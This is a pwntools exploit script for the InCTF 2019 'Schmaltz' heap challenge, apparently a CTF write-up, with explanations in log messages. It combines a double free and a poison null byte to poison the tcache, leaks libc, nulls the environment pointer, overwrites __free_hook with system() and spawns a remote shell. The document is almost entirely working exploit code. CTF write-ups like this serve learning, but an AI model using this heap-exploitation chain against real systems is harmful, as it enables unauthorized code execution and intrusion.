#!/usr/bin/env python2
from pwn import *

# InCTF 2019 - Schmaltz
# Write-Up by semchapeu


context.binary = "./schmaltz"
e = context.binary
host = "52.23.219.15"
port =  1337

glibc = ELF("./libc.so.6")

#p = process(e.path+"_patched",env={"LD_PRELOAD":"./libc.so.6"})
#p = process(e.path,env={"LD_PRELOAD":"./libc.so.6"})
p = remote(host,port)

def u_64(b):
    return u64(b + (8 - len(b)) * "\x00")

def menu_choice(choice):
    p.recvuntil("Surrender")
    p.sendline(str(choice))

def add(size, content,newline=True):
    menu_choice(1)
    p.recvuntil("Size of note")
    p.sendline(str(size))
    p.recvuntil("Enter content")
    if newline:
        p.sendline(content)
    else:
        p.send(content)

def delete(chunk_id):
    menu_choice(4)
    p.recvuntil("Index")
    p.sendline(str(chunk_id))

def view(chunk_id,leak=True):
    menu_choice(3)
    p.recvuntil("Index")
    p.sendline(str(chunk_id))
    if leak:
        p.recvline_contains("Content: ")
    else:
        p.recvuntil("Content: ")
    return p.recvline(keepends=False)

def poison_tcache(addr, size=0x100, i=0):
    assert(size >= 0x100 and size < 0x1f8)
    add(size+0x8,(size+0x6)*str(i+0))
    add(size+0x8,(size+0x6)*str(i+1))
    delete(i+1)
    delete(i+0)
    add(size+0x8,(size+0x7)*str(i+2)) # overwrite size of i+1
    delete(i+1) # now addr of i+1 is in tcache of 0x110 and 0x100
    add(0xf8,p64(addr))
    add(size+0x8,"/bin/sh\x00")

def leak_libc():
    stderr = 0x602040
    poison_tcache(stderr)
    add(0x108,"")
    leak = u_64('\x00' + view(2).strip())
    return leak-0x3b1600

log.info("""
There are two vulnerabilities:

    1. double free
    2. poison null-byte gets placed after the chunk overwriting the size
       of the next chunk.

The used libc version detects double frees in the same tcache. If it didn't,
this vulnerability alone would be enough to exploit the program.
To poison the tcache we use both vulnerabilities in combination.

    1. free a chunk of the size e.g. 0x110 bytes, so its address gets placed into
       the 0x110 tcache.
    2. Use the poison null-byte vulnerability to change the size of the freed chunk
       to 0x100.
    3. Use the double-free vulnerability to free the chunk again. So its address
       gets placed into the 0x100 tcache. We now have the same address in two 
       different tcaches.
    4. Allocate a 0x100 chunk with the poisoning address in it.
    5. Allocate a 0x110 chunk, thus poisoning the 0x110 tcache.
    6. The next allocation of an 0x110 chunk will be at the poisoned address.

""")

log.info("""
Leaking libc:
Leaking libc by poisoning the tcache to the address of stderr in the .bss segment.
There is a pointer into libc there, we accidentally overwrite the least significant
byte of the pointer, but that doesn't matter as it's not part of ASLR randomization.
We then view the chunk, thus printing the libc address from which we can calculate
the libc base address.
""")

log.info("""
Hurdles:
1. The program preloads a custom libc, which is not compatible with /bin/sh on the server.
To circumvent this problem, we overwrite the environment pointer in libc with a NULL pointer.
So when we run system("/bin/sh"); it gets started with an empty environment, 
ie without the LD_PRELOAD variable.
2. The note_ctr must remain below 7. After poisoning the tcache once, it's 3 and after poising it
a second time it's 6. So we use the second tcache poisoning to overwrite the note_ctr back to 0.

Exploit:
    1. leak libc
    2. reset note_ctr
    3. NULL the environment pointer
    4. overwrite the __free_hook with system()
    5. free a chunk with "/bin/sh" in it
    6. get shell
""")

libc = leak_libc()
log.info("libc is at {}".format(hex(libc)))
free_hook = glibc.symbols["__free_hook"] + libc
log.info("__free_hook is at {}".format(hex(free_hook)))
system = glibc.symbols["system"] + libc # execl works too
log.info("system is at {}".format(hex(system)))
environ = glibc.symbols["environ"] + libc
log.info("environ is at {}".format(hex(environ)))
note_ctr = e.symbols["note_ctr"]
 
log.info("Resetting note_ctr to 0 (-1 + 1)")
poison_tcache(note_ctr, size=0x120, i=3)
add(0x128,p64(0xffffffffffffffff))

log.info("NULLing environment pointer")
poison_tcache(environ, size=0x130)
add(0x138,p64(0x0))

log.info("Overwriting the __free_hook with system address")
poison_tcache(free_hook, size=0x140, i=3)
add(0x148,p64(system))

# print repr(view(5,False)) # __free_hook
# print repr(view(0,False)) # contains /bin/sh
#gdb.attach(p)

log.info("Triggering __free_hook by freeing a chunk with '/bin/sh' in it")
delete(0) # 0 1 3 4 
p.success("shell:")
p.interactive()
